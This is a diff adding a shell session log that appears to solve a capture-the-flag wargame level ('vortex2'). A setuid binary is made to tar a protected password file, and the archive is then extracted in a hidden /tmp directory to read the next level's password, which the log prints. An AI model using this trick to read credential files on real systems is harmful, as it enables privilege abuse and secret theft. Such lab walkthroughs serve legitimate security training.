@@ -1,0 +1,10 @@
+vortex2@melinda:/vortex$ ./vortex2 /etc/vortex_pass/vortex3
+vortex2@melinda:/vortex$ cd /tmp
+vortex2@melinda:/tmp$ mkdir .l0
+vortex2@melinda:/tmp$ cd .l0
+vortex2@melinda:/tmp/.l0$ cp '../ownership.$$.tar' .
+vortex2@melinda:/tmp/.l0$ tar -xvf ownership.\$\$.tar
+etc/vortex_pass/vortex3
+vortex2@melinda:/tmp/.l0$ cd etc/vortex_pass
+vortex2@melinda:/tmp/.l0/etc/vortex_pass$ cat vortex3
+64ncXTvx#
